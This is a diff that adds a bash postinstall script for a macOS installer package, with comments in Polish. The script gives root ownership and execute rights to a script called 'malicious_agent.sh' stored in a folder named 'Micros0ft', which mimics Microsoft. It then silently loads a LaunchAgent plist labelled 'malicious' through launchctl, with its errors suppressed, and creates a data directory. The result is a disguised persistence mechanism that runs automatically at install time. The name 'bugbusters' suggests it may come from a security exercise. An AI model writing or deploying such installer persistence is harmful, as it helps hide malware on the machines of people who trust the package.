@@ -1,0 +1,36 @@
+#!/bin/bash
+
+# Postinstall script dla pakietu .pkg
+# Instaluje i uruchamia Launch Agent po instalacji pakietu
+
+AGENT_DIR="/Users/Shared/Micros0ft"
+PLIST_NAME="com.bugbusters.malicious.plist"
+PLIST_PATH="/Library/LaunchAgents/$PLIST_NAME"
+SCRIPT_PATH="$AGENT_DIR/malicious_agent.sh"
+
+# Ustaw uprawnienia dla skryptu agenta
+if [ -f "$SCRIPT_PATH" ]; then
+    chmod +x "$SCRIPT_PATH"
+    chown root:wheel "$SCRIPT_PATH"
+fi
+
+# Ustaw uprawnienia dla pliku plist
+if [ -f "$PLIST_PATH" ]; then
+    chown root:wheel "$PLIST_PATH"
+    chmod 644 "$PLIST_PATH"
+fi
+
+# Załaduj Launch Agent
+if [ -f "$PLIST_PATH" ]; then
+    # Użyj bootout/bootout dla nowszych wersji macOS
+    launchctl bootstrap system "$PLIST_PATH" 2>/dev/null || \
+    launchctl load "$PLIST_PATH" 2>/dev/null || \
+    launchctl load -w "$PLIST_PATH" 2>/dev/null || true
+fi
+
+# Utwórz katalog na dane jeśli nie istnieje
+mkdir -p "$AGENT_DIR/data" 2>/dev/null
+chmod 755 "$AGENT_DIR" 2>/dev/null
+
+exit 0
+
